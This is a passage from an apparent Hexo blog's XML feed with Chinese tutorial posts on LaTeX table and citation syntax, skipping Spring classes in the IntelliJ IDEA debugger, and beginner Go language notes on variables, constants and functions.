class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;table&#125;[]</span><br><span class="line"><span class="keyword">\caption</span>&#123;this is a table&#125;<span class="keyword">\label</span>&#123;table1&#125;</span><br><span class="line"><span class="keyword">\begin</span>&#123;tabular&#125;&#123;|c|c|c|c|&#125; <span class="comment">%表示表格有4列，c表示居中，|表示表格的边框(|c|就是两边都有边框)</span></span><br><span class="line"><span class="keyword">\hline</span> <span class="comment">% 表示表格横着的边框</span></span><br><span class="line">A1 <span class="built_in">&amp;</span> A2 <span class="built_in">&amp;</span> A3 <span class="built_in">&amp;</span> A4 <span class="keyword">\\</span> <span class="comment">%表格的第1行，每个单元格使用 &amp; 分隔</span></span><br><span class="line"><span class="keyword">\hline</span></span><br><span class="line">B1 <span class="built_in">&amp;</span> B2 <span class="built_in">&amp;</span> B3 <span class="built_in">&amp;</span>B4 <span class="keyword">\\</span> <span class="comment">%表格的第2行</span></span><br><span class="line">C1 <span class="built_in">&amp;</span> C2 <span class="built_in">&amp;</span> C3 <span class="built_in">&amp;</span> C4 <span class="keyword">\\</span> <span class="comment">%表格的第3行 </span></span><br><span class="line"><span class="keyword">\hline</span></span><br><span class="line"><span class="keyword">\end</span>&#123;tabular&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;table&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E9%82%A3%E4%BA%9B%E5%B9%B4%E5%9C%A8latex%E4%B8%8A%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91.assets/image-20230304155552823.png" alt="image-20230304155552823"></p><ul><li>表头带斜线的表格</li></ul><p>导包</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>&#123;diagbox&#125;</span><br></pre></td></tr></table></figure><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;table&#125;[]</span><br><span class="line"><span class="keyword">\caption</span>&#123;this is a table&#125;<span class="keyword">\label</span>&#123;table1&#125;</span><br><span class="line"><span class="keyword">\begin</span>&#123;tabular&#125;&#123;|c|c|c|c|&#125; <span class="comment">%表示表格有4列，c表示居中，|表示表格的边框(|c|就是两边都有边框)</span></span><br><span class="line"><span class="keyword">\hline</span> <span class="comment">% 表示表格横着的边框</span></span><br><span class="line"><span class="keyword">\diagbox</span>&#123;A11&#125;&#123;A12&#125; <span class="built_in">&amp;</span> A2 <span class="built_in">&amp;</span> A3 <span class="built_in">&amp;</span> A4 <span class="keyword">\\</span> <span class="comment">%表格的第1行，每个单元格使用 &amp; 分隔</span></span><br><span class="line"><span class="keyword">\hline</span></span><br><span class="line">B1 <span class="built_in">&amp;</span> B2 <span class="built_in">&amp;</span> B3 <span class="built_in">&amp;</span>B4 <span class="keyword">\\</span> <span class="comment">%表格的第2行</span></span><br><span class="line">C1 <span class="built_in">&amp;</span> C2 <span class="built_in">&amp;</span> C3 <span class="built_in">&amp;</span> C4 <span class="keyword">\\</span> <span class="comment">%表格的第3行 </span></span><br><span class="line"><span class="keyword">\hline</span></span><br><span class="line"><span class="keyword">\end</span>&#123;tabular&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;table&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E9%82%A3%E4%BA%9B%E5%B9%B4%E5%9C%A8latex%E4%B8%8A%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91.assets/image-20230304155645970.png" alt="image-20230304155645970"></p><ul><li>跨行跨列</li></ul><p>导包</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>&#123;multirow&#125;</span><br></pre></td></tr></table></figure><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;table&#125;[]</span><br><span class="line"><span class="keyword">\caption</span>&#123;this is a table&#125;<span class="keyword">\label</span>&#123;table1&#125;</span><br><span class="line"><span class="keyword">\begin</span>&#123;tabular&#125;&#123;|c|c|cc|cc|&#125; <span class="comment">%表示表格有4列，c表示居中，|表示表格的边框(|c|就是两边都有边框)</span></span><br><span class="line"><span class="keyword">\hline</span> <span class="comment">% 表示表格横着的边框</span></span><br><span class="line"><span class="keyword">\multirow</span>&#123;2&#125;&#123;*&#125;&#123;A1&#125; <span class="built_in">&amp;</span> <span class="keyword">\multirow</span>&#123;2&#125;&#123;*&#125;&#123;A2&#125; <span class="built_in">&amp;</span>  <span class="comment">% \multirow是跨行</span></span><br><span class="line"><span class="keyword">\multicolumn</span>&#123;2&#125;&#123;c|&#125;&#123;A34&#125; <span class="built_in">&amp;</span> <span class="keyword">\multicolumn</span>&#123;2&#125;&#123;c|&#125;&#123;A45&#125; <span class="keyword">\\</span>  <span class="comment">% \multicolumn是跨列</span></span><br><span class="line"><span class="keyword">\cline</span>&#123;3-6&#125; <span class="comment">% \cline为局部划线，表示3列到6列画横线</span></span><br><span class="line"> <span class="built_in">&amp;</span> <span class="built_in">&amp;</span> B3 <span class="built_in">&amp;</span> B4 <span class="built_in">&amp;</span> B5 <span class="built_in">&amp;</span>B6 <span class="keyword">\\</span></span><br><span class="line"><span class="keyword">\hline</span></span><br><span class="line">C1 <span class="built_in">&amp;</span> C2 <span class="built_in">&amp;</span> C3 <span class="built_in">&amp;</span> C4 <span class="built_in">&amp;</span>C5 <span class="built_in">&amp;</span>C6 <span class="keyword">\\</span> </span><br><span class="line"><span class="keyword">\hline</span></span><br><span class="line">C1 <span class="built_in">&amp;</span> C2 <span class="built_in">&amp;</span> C3 <span class="built_in">&amp;</span> C4 <span class="built_in">&amp;</span>C5 <span class="built_in">&amp;</span>C6 <span class="keyword">\\</span> </span><br><span class="line"><span class="keyword">\hline</span></span><br><span class="line"><span class="keyword">\end</span>&#123;tabular&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;table&#125;</span><br></pre></td></tr></table></figure><ul><li>文中引用</li></ul><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I have a table <span class="keyword">\ref</span>&#123;table1&#125;.</span><br></pre></td></tr></table></figure><p><img src="/images/%E9%82%A3%E4%BA%9B%E5%B9%B4%E5%9C%A8latex%E4%B8%8A%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91.assets/image-20230304160515751.png" alt="image-20230304160515751"></p><h2 id="6-参考文献"><a href="#6-参考文献" class="headerlink" title="6.参考文献"></a>6.参考文献</h2><p>先将要引用的参考文献的bib格式写到<strong>test1.bib</strong>文件内</p><p><img src="/images/%E9%82%A3%E4%BA%9B%E5%B9%B4%E5%9C%A8latex%E4%B8%8A%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91.assets/image-20230304161828726.png" alt="image-20230304161828726"></p><p>在tex文件中引用这个文件</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\bibliographystyle</span>&#123;ACM-Reference-Format&#125; <span class="comment">%引用样式</span></span><br><span class="line"><span class="keyword">\bibliography</span>&#123;test1&#125;</span><br></pre></td></tr></table></figure><p>在文中标注引用</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I have a reference<span class="keyword">\cite</span>&#123;paper1,paper2,....&#125;</span><br></pre></td></tr></table></figure><img src="/images/那些年在latex上踩过的坑.assets/image-20230304161955627.png" alt="image-20230304161955627" style="zoom:50%;"><p>和我们平常看到的不一样，我们可以使用其他期刊的样式，把参考文献前面变成序号</p><blockquote><p>参考文献的bib格式在谷歌学术或者论文网站都可以复制</p></blockquote><img src="/images/那些年在latex上踩过的坑.assets/image-20230304162406708.png" alt="image-20230304162406708" style="zoom:50%;"><h1 id="三、常用公式表达式整理"><a href="#三、常用公式表达式整理" class="headerlink" title="三、常用公式表达式整理"></a>三、常用公式表达式整理</h1><p>转载自 <a href="https://www.cnblogs.com/echo-coding/p/8663676.html">https://www.cnblogs.com/echo-coding/p/8663676.html</a></p><ul><li>常用表达式</li></ul><p><img src="/images/%E9%82%A3%E4%BA%9B%E5%B9%B4%E5%9C%A8latex%E4%B8%8A%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91.assets/image-20230304163235289.png" alt="image-20230304163235289"></p><ul><li>常用希腊字母</li></ul><p><img src="/images/%E9%82%A3%E4%BA%9B%E5%B9%B4%E5%9C%A8latex%E4%B8%8A%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91.assets/image-20230304163331552.png" alt="image-20230304163331552"></p><ul><li>常用数学公式</li></ul><p><img src="/images/%E9%82%A3%E4%BA%9B%E5%B9%B4%E5%9C%A8latex%E4%B8%8A%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91.assets/image-20230304163422004.png" alt="image-20230304163422004"></p>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文格式 </tag>
            
            <tag> latex </tag>
            
            <tag> texstudio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA在debug时单步调试跳过某些类</title>
      <link href="/2023/03/04/IDEA%E5%9C%A8debug%E6%97%B6%E5%8D%95%E6%AD%A5%E8%B0%83%E8%AF%95%E8%B7%B3%E8%BF%87%E6%9F%90%E4%BA%9B%E7%B1%BB/"/>
      <url>/2023/03/04/IDEA%E5%9C%A8debug%E6%97%B6%E5%8D%95%E6%AD%A5%E8%B0%83%E8%AF%95%E8%B7%B3%E8%BF%87%E6%9F%90%E4%BA%9B%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="一、问题描述"><a href="#一、问题描述" class="headerlink" title="一、问题描述"></a>一、问题描述</h1><p>我们在进入debug模式后，会碰到一些程序使用了代理或者其他原因，导致我们单步调试时会进入代理类或其他我们不想看到的类。就像下图这样，直接进入到了<strong>org.springframework.aop.framework</strong>包下的<strong>CglibProxy</strong>类</p><p><img src="/images/IDEA%E5%9C%A8debug%E6%97%B6%E6%80%BB%E6%98%AF%E8%BF%9B%E5%85%A5%E4%B8%8D%E6%83%B3%E7%9C%8B%E5%88%B0%E7%B1%BB%E6%80%8E%E4%B9%88%E5%8A%9E.assets/image-20230301203022719.png" alt="image-20230301203022719"></p><h1 id="二、问题解决"><a href="#二、问题解决" class="headerlink" title="二、问题解决"></a>二、问题解决</h1><p>我们只需在设置中将我们不想进入的类设置为<strong>Do not step into</strong>即可</p><p><strong>File – settings – Build,Execution,Deplotment – Debugger – Stepping – Add Pattern</strong></p><p><img src="/images/IDEA%E5%9C%A8debug%E6%97%B6%E6%80%BB%E6%98%AF%E8%BF%9B%E5%85%A5%E4%B8%8D%E6%83%B3%E7%9C%8B%E5%88%B0%E7%B1%BB%E6%80%8E%E4%B9%88%E5%8A%9E.assets/image-20230301203125998.png" alt="image-20230301203125998"></p><p>我们测试一下，单步调试已经不会进入<strong>CglibProxy</strong>类了，但是又进入了<strong>org.springframework.util</strong>包下的<strong>ReflectionUtils</strong>类</p><p><img src="/images/IDEA%E5%9C%A8debug%E6%97%B6%E6%80%BB%E6%98%AF%E8%BF%9B%E5%85%A5%E4%B8%8D%E6%83%B3%E7%9C%8B%E5%88%B0%E7%B1%BB%E6%80%8E%E4%B9%88%E5%8A%9E.assets/image-20230301203217864.png" alt="image-20230301203217864"></p><p>其实，我们发现他们都是<strong>org.springframework</strong>包下的，这个包时spring的源码包，我们是不用调试它的，直接使用*****都匹配上就可以了</p><p><img src="/images/IDEA%E5%9C%A8debug%E6%97%B6%E6%80%BB%E6%98%AF%E8%BF%9B%E5%85%A5%E4%B8%8D%E6%83%B3%E7%9C%8B%E5%88%B0%E7%B1%BB%E6%80%8E%E4%B9%88%E5%8A%9E.assets/image-20230301203439803.png" alt="image-20230301203439803"></p><p>至此，问题解决</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习笔记</title>
      <link href="/2023/01/09/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/01/09/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>声明：本文为b站大佬<strong>刘丹冰Aceld</strong>的<strong>8小时转职Golang工程师</strong>视频学习笔记，如有侵权，联系我速删</p><p>大佬的传送门：<a href="https://www.bilibili.com/video/BV1gf4y1r79E/?spm_id_from=333.999.0.0&amp;vd_source=95a9bb0b0759f8d391968411c1a6f007">https://www.bilibili.com/video/BV1gf4y1r79E/?spm_id_from=333.999.0.0&amp;vd_source=95a9bb0b0759f8d391968411c1a6f007</a></p></blockquote><p>在b站发现了大佬的宝藏视频，在此记录下学习过程。我在这里着重学习记录的是go语言的特性，也就是go与其他后端语言有区别的地方。并且在文章的末尾附上我使用go语言开发的即时通信系统的github地址。</p><h1 id="一、目录"><a href="#一、目录" class="headerlink" title="一、目录"></a>一、目录</h1><p>1.初识go语言</p><p>2.变量与常量</p><p>3.函数的返回值与defer</p><p>4.golang中的数组</p><p>5.golang中的map</p><p>6.golang面向对象基础</p><p>7.golang中的反射</p><p>8.goroutine和channel</p><h1 id="二、初识go语言"><a href="#二、初识go语言" class="headerlink" title="二、初识go语言"></a>二、初识go语言</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main <span class="comment">//程序的包名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ( <span class="comment">//程序导包</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; <span class="comment">//函数声明行末必须是左花括号</span></span><br><span class="line">fmt.Println(<span class="string">&quot;Hello,go!!!&quot;</span>)</span><br><span class="line">time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109105022987.png" alt="image-20230109105022987"></p><p><strong>知识点：</strong></p><p>1.程序的第一行是包名，使用<strong>package</strong>关键字</p><p>2.使用<strong>import</strong>关键字进行导包</p><p>3.go语言中函数声明行末必须是左花括号</p><h1 id="三、变量与常量"><a href="#三、变量与常量" class="headerlink" title="三、变量与常量"></a>三、变量与常量</h1><h2 id="1-声明变量的四种方式"><a href="#1-声明变量的四种方式" class="headerlink" title="1.声明变量的四种方式"></a>1.声明变量的四种方式</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//1.声明一个变量，不赋初值，默认为0</span></span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span></span><br><span class="line">fmt.Println(<span class="string">&quot;a =&quot;</span>, a)</span><br><span class="line"><span class="comment">//2.为变量赋初值</span></span><br><span class="line"><span class="keyword">var</span> b <span class="type">string</span> = <span class="string">&quot;字符串&quot;</span></span><br><span class="line">fmt.Println(<span class="string">&quot;b =&quot;</span>, b)</span><br><span class="line"><span class="comment">//3.省去数据类型，自动推断</span></span><br><span class="line"><span class="keyword">var</span> c = <span class="number">100.00</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;c is %T\n&quot;</span>, c)</span><br><span class="line"><span class="comment">//4.省去var关键字</span></span><br><span class="line"><span class="comment">//注意：冒等不可用来声明全局变量，即只能是在函数体内使用</span></span><br><span class="line">d := <span class="number">60</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;the type of c is %T\n&quot;</span>, d)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109110102171.png" alt="image-20230109110102171"></p><p><strong>知识点：</strong></p><p>(1) 我们通常使用fmt包中的Println函数来输出一行内容，相当于python中的print函数，其中的逗号表示使用空格连接，会自动在末尾加上换行符。</p><p>(2) fmt包中的Printf函数为格式化输出，不会自动加换行符，需要手动添加。其中的格式化参数:</p><ul><li><code>%T</code> 打印变量的类型.</li><li><code>%v</code> 以默认的方式打印变量的值.例如在结构体中{jack {12345 6789}}</li><li><code>%+v</code> 带字段名称.例如在结构体中{name:jack  phone:{mobile:12345 office:6789}</li><li><code>%t</code> 打印true或false</li><li>……</li></ul><p>(3) 我们通常在函数体内使用冒等(:&#x3D;)的写法来初始化变量，并给它赋值</p><h2 id="2-声明多个变量"><a href="#2-声明多个变量" class="headerlink" title="2.声明多个变量"></a>2.声明多个变量</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> m, n <span class="type">int</span> = <span class="number">100</span>, <span class="number">200</span></span><br><span class="line"><span class="keyword">var</span> j, k = <span class="number">300</span>, <span class="string">&quot;abc&quot;</span></span><br><span class="line">c, v := <span class="number">1.5</span>, <span class="literal">true</span></span><br><span class="line">fmt.Println(m, n, j, k, c, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">z <span class="type">bool</span> = <span class="literal">true</span></span><br><span class="line">x <span class="type">int</span>  = <span class="number">1</span></span><br><span class="line">)</span><br><span class="line">fmt.Println(z, x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109111702647.png" alt="image-20230109111702647"></p><h2 id="3-const与iota"><a href="#3-const与iota" class="headerlink" title="3.const与iota"></a>3.const与iota</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//const定义枚举</span></span><br><span class="line"><span class="keyword">const</span>(</span><br><span class="line"><span class="comment">//可以在const使用关键字iota,初值为0，每行+1</span></span><br><span class="line">MONDAY = <span class="literal">iota</span>+<span class="number">1</span> <span class="comment">//iota=0 ,iota+1=1</span></span><br><span class="line">TUESDAY  <span class="comment">//iota=1 ,iota+1=2</span></span><br><span class="line">WEDNESDAY  <span class="comment">//iota=2 ,iota+1=3</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span>(</span><br><span class="line">a,b = <span class="literal">iota</span>+<span class="number">1</span>,<span class="literal">iota</span>+<span class="number">2</span> <span class="comment">//iota=0</span></span><br><span class="line">c,d<span class="comment">//iota=1</span></span><br><span class="line">e,f<span class="comment">//iota=2</span></span><br><span class="line"></span><br><span class="line">g,h = <span class="literal">iota</span>*<span class="number">2</span> , <span class="literal">iota</span>*<span class="number">3</span> <span class="comment">//iota=3</span></span><br><span class="line">m,n</span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//常量（只读属性）</span></span><br><span class="line"><span class="keyword">const</span> length <span class="type">int</span> = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">fmt.Println(MONDAY,TUESDAY,WEDNESDAY)</span><br><span class="line">fmt.Println(a,b,c,d,e,f,g,h,m,n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109112016337.png" alt="image-20230109112016337"></p><p><strong>知识点：</strong></p><p>(1) 常量的定义格式和变量的声明语法类似</p><p>(2) iota是常量计数器，在第一行为0，之后每新增一行常量声明将使iota计数一次</p><h1 id="四、函数的返回值与defer"><a href="#四、函数的返回值与defer" class="headerlink" title="四、函数的返回值与defer"></a>四、函数的返回值与defer</h1><h2 id="1-函数多返回值的几种写法"><a href="#1-函数多返回值的几种写法" class="headerlink" title="1.函数多返回值的几种写法"></a>1.函数多返回值的几种写法</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//只有一个返回值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo1</span><span class="params">(a <span class="type">string</span>, b <span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">c := <span class="number">11111</span></span><br><span class="line">fmt.Println(<span class="string">&quot;进入了函数1,并输入两个参数:&quot;</span>, a, b)</span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//有多个返回值，匿名的</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo2</span><span class="params">(a <span class="type">string</span>, b <span class="type">string</span>)</span></span> (<span class="type">int</span>, <span class="type">string</span>) &#123;</span><br><span class="line">c := <span class="number">2222222</span></span><br><span class="line">d := <span class="string">&quot;222222&quot;</span></span><br><span class="line">fmt.Println(<span class="string">&quot;进入了函数2,并输入两个参数:&quot;</span>, a, b)</span><br><span class="line"><span class="keyword">return</span> c, d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回多个值，有形参名称的</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo3</span><span class="params">(a <span class="type">string</span>, b <span class="type">string</span>)</span></span> (r1 <span class="type">int</span>, r2 <span class="type">string</span>) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;进入了函数3,并输入两个参数:&quot;</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="comment">//给有名称的返回值变量赋值</span></span><br><span class="line">r1 = <span class="number">333</span></span><br><span class="line">r2 = <span class="string">&quot;333333333&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回多个值，有形参名称的,且形参类型相同，可省略只写一个</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo4</span><span class="params">(a <span class="type">string</span>, b <span class="type">string</span>)</span></span> (r1, r2 <span class="type">int</span>) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;进入了函数4,并输入两个参数:&quot;</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="comment">//给有名称的返回值变量赋值</span></span><br><span class="line">r1 = <span class="number">444</span></span><br><span class="line">r2 = <span class="number">444444</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(foo1(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span>))</span><br><span class="line"></span><br><span class="line">ret1, ret2 := foo2(<span class="string">&quot;2&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">fmt.Println(ret1, ret2)</span><br><span class="line"></span><br><span class="line">ret3, ret4 := foo3(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">fmt.Println(ret3, ret4)</span><br><span class="line"></span><br><span class="line">ret5, ret6 := foo4(<span class="string">&quot;4&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">fmt.Println(ret5, ret6)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109153955212.png" alt="image-20230109153955212"></p><p><strong>知识点：</strong></p><p>(1) 函数声明语法： func 函数名(形参 形参数据类型，……)(返回值参数 返回值类型，…){</p><p>(2) 大多数 <code>a int,b int,c int</code>这种形式都可以简写为<code>a, b, c int</code></p><p>(3) 函数名首字母小写表示只能在当前文件内调用，像我们常用的fmt.Println()首字母大写，可以在其他文件内调用</p><h2 id="2-defer语句调用流程"><a href="#2-defer语句调用流程" class="headerlink" title="2.defer语句调用流程"></a>2.defer语句调用流程</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数名首字母小写表示只能在当前文件内调用</span></span><br><span class="line"><span class="comment">//在函数return之后才会进行defer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deferAndReturn</span><span class="params">()</span></span> <span class="type">int</span> 